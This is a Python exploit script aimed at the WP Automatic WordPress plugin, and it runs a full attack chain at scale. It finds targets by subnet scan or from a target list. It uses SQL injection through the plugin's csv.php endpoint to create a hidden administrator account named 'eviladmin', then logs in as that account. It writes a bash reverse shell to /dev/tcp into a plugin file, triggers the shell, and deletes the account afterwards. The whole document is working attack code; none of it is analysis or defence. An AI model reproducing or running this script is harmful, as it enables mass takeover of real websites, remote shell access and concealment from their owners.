import argparse
import hashlib
import logging
import queue
import re
import sys
import threading
import time
from ipaddress import ip_network

import requests
from requests.exceptions import RequestException

# Global queue for target URLs
q = queue.Queue()

# Configure logging to console and file
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("wp_automatic_exploit.log"),
    ],
)
logger = logging.getLogger(__name__)

def parse_arguments():
    """Parse and return command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Exploit WP Automatic plugin SQL‑injection vulnerability."
    )
    parser.add_argument(
        "--lhost", default="127.0.0.1",
        help="Listener IP address (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--lport", type=int, default=1414,
        help="Listener port (default: 1414)"
    )
    parser.add_argument(
        "--threads", type=int, default=10,
        help="Number of worker threads (default: 10)"
    )
    parser.add_argument(
        "--targets", help="Path to file with list of target URLs (one per line)"
    )
    parser.add_argument(
        "--subnet", help="CIDR subnet to scan (e.g. 192.168.1.0/24)"
    )
    parser.add_argument(
        "--delay", type=float, default=1.0,
        help="Delay between processing targets in seconds (default: 1.0)"
    )
    return parser.parse_args()

def scan_subnet(subnet_cidr):
    """Add all hosts in subnet to the queue (both http and https)."""
    try:
        network = ip_network(subnet_cidr)
    except ValueError as e:
        logger.error(f"Invalid subnet '{subnet_cidr}': {e}")
        return
    for ip in network.hosts():
        for scheme in ("http", "https"):
            q.put(f"{scheme}://{ip}/wordpress")

def read_targets_file(path):
    """Read target URLs from file and enqueue them."""
    try:
        with open(path) as f:
            for line in f:
                url = line.strip()
                if url.startswith(("http://", "https://")):
                    q.put(url)
                else:
                    logger.warning(f"Skipping invalid URL: {url}")
    except IOError as e:
        logger.error(f"Could not read targets file '{path}': {e}")

def generate_user_agent():
    """Return a pseudo-random User‑Agent header value."""
    agents = [
        # Common browser UA strings
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    ]
    idx = int(hashlib.md5(str(time.time()).encode()).hexdigest(), 16) % len(agents)
    return agents[idx]

def get_integrity_hash(query):
    """Compute MD5 integrity hash for given SQL query."""
    return hashlib.md5(query.encode()).hexdigest()

def check_vulnerability(base_url):
    """
    Detect if WP Automatic plugin < 3.52 is installed and vulnerable.
    Returns True if vulnerable.
    """
    query = (
        "SELECT * FROM `wp_plugins` WHERE `plugin_name` LIKE '%wp-automatic%' "
        "AND `plugin_version` < '3.52'"
    )
    data = {
        "q": query,
        "auth": " ",
        "integ": get_integrity_hash(query),
    }
    try:
        resp = requests.post(
            f"{base_url}/wp-content/plugins/wp-automatic/inc/csv.php",
            data=data, timeout=10
        )
        text = resp.text
        # vulnerable if plugin appears but version not shown
        if "wp-automatic" in text and "plugin_version" not in text:
            return True
        return False
    except RequestException as e:
        logger.error(f"[{base_url}] vulnerability check failed: {e}")
        return False

def insert_user(plugin_endpoint, headers):
    """Insert a new admin user 'eviladmin' via SQL injection."""
    sql = (
        "INSERT INTO wp_users "
        "(user_login,user_pass,user_nicename,user_email,"
        "user_url,user_registered,user_status,display_name) "
        "VALUES ('eviladmin','$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0',"
        "'eviladmin','eviladmin@gmail.com','http://127.0.0.1:8000',"
        "'2024-04-30 16:26:43',0,'eviladmin')"
    )
    data = {"q": sql, "auth": " ", "integ": get_integrity_hash(sql)}
    try:
        resp = requests.post(plugin_endpoint, headers=headers, data=data, timeout=10)
        return "INSERT INTO wp_users" in resp.text
    except RequestException as e:
        logger.error(f"[{plugin_endpoint}] insert user failed: {e}")
        return False

def find_user_id(plugin_endpoint, headers):
    """Locate the newly created 'eviladmin' user ID by querying up to 1000 IDs."""
    for uid in range(1000):
        sql = f"SELECT * FROM `wp_users` WHERE user_login='eviladmin' AND ID={uid}"
        data = {"q": sql, "integ": get_integrity_hash(sql)}
        try:
            resp = requests.post(plugin_endpoint, headers=headers, data=data, timeout=10)
            if "eviladmin" in resp.text and '"ID"' in resp.text:
                m = re.search(r'"ID"\s*:\s*"(\d+)"', resp.text)
                if m:
                    return m.group(1)
        except RequestException:
            break
    return None

def add_admin_role(plugin_endpoint, headers, user_id):
    """Grant administrator capabilities to the specified user ID."""
    sql = (
        f"INSERT INTO wp_usermeta (user_id,meta_key,meta_value) "
        f"VALUES ({user_id},'wp_capabilities',"
        f"'a:1:{{s:13:\"administrator\";s:1:\"1\";}}')"
    )
    data = {"q": sql, "auth": " ", "integ": get_integrity_hash(sql)}
    try:
        resp = requests.post(plugin_endpoint, headers=headers, data=data, timeout=10)
        return "INSERT INTO wp_usermeta" in resp.text
    except RequestException as e:
        logger.error(f"[{plugin_endpoint}] add role failed: {e}")
        return False

def upload_shell(domain, headers, nonce, lhost, lport):
    """Upload a PHP reverse shell to the plugin file."""
    uri = f"{domain}/wp-admin/admin-ajax.php"
    payload = {
        "nonce": nonce,
        "_wp_http_referer": (
            "/wordpress/wp-admin/plugin-editor.php?"
            "file=wp-automatic%2Findex.php&plugin="
            "wp-automatic%2Fwp-automatic.php"
        ),
        "newcontent": (
            "<?php\n"
            f"exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");\n"
            "?>"
        ),
        "action": "edit-theme-plugin-file",
        "file": "wp-automatic/index.php",
        "plugin": "wp-automatic/wp-automatic.php",
    }
    try:
        resp = requests.post(uri, headers=headers, data=payload, timeout=10)
        return "File edited successfully" in resp.text
    except RequestException as e:
        logger.error(f"[{uri}] shell upload failed: {e}")
        return False

def clean_up(plugin_endpoint, headers):
    """Remove the eviladmin user and its metadata."""
    for sql in (
        "DELETE FROM wp_users WHERE user_login='eviladmin'",
        "DELETE FROM wp_usermeta WHERE user_id IN "
        "(SELECT ID FROM wp_users WHERE user_login='eviladmin')"
    ):
        data = {"q": sql, "auth": " ", "integ": get_integrity_hash(sql)}
        try:
            resp = requests.post(plugin_endpoint, headers=headers, data=data, timeout=10)
            logger.info(f"Clean-up response: {resp.text}")
        except RequestException as e:
            logger.error(f"Clean-up failed: {e}")

def exploit_target(url, lhost, lport):
    """Run full exploit chain against a single target URL."""
    if not check_vulnerability(url):
        logger.info(f"[{url}] Not vulnerable or plugin missing")
        return

    plugin_ep = url.rstrip("/") + "/wp-content/plugins/wp-automatic/inc/csv.php"
    headers = {
        "User-Agent": generate_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    if not insert_user(plugin_ep, headers):
        logger.error(f"[{url}] Failed to insert user")
        return

    user_id = find_user_id(plugin_ep, headers)
    if not user_id:
        logger.error(f"[{url}] Could not find new user ID")
        return

    if not add_admin_role(plugin_ep, headers, user_id):
        logger.error(f"[{url}] Failed to grant admin role")
        return

    logger.info(f"[{url}] eviladmin created with ID {user_id}")

    # Authenticate and retrieve nonce for editing
    session = requests.Session()
    session.headers.update(headers)
    login_data = {
        "log": "eviladmin", "pwd": "eviladmin",
        "wp-submit": "Log In", "testcookie": "1"
    }
    session.post(url + "/wp-login.php", data=login_data, timeout=10)

    resp = session.get(
        url + "/wp-admin/plugin-editor.php?plugin=wp-automatic%2Findex.php", 
        timeout=10
    )
    m = re.search(r'<input type="hidden" name="nonce" value="([^"]+)"', resp.text)
    if not m:
        logger.error(f"[{url}] Nonce not found")
        return

    if not upload_shell(url, headers, m.group(1), lhost, lport):
        logger.error(f"[{url}] Shell upload failed")
        return

    # Trigger the shell
    try:
        requests.get(url + "/wp-content/plugins/wp-automatic/index.php", timeout=10)
        logger.info(f"[{url}] Reverse shell executed")
    except RequestException:
        pass

    clean_up(plugin_ep, headers)

def worker(delay, lhost, lport):
    """Thread worker: process URLs from the queue."""
    while True:
        target = q.get()
        try:
            exploit_target(target, lhost, lport)
        except Exception as e:
            logger.error(f"[{target}] unexpected error: {e}")
        finally:
            q.task_done()
            time.sleep(delay)

def main():
    args = parse_arguments()

    # Launch worker threads
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(args.delay, args.lhost, args.lport),
            daemon=True
        )
        t.start()

    # Enqueue targets
    if args.targets:
        read_targets_file(args.targets)
    elif args.subnet:
        scan_subnet(args.subnet)
    else:
        logger.error("Specify either --targets or --subnet")
        sys.exit(1)

    # Wait until all tasks complete
    q.join()

if __name__ == "__main__":
    main()
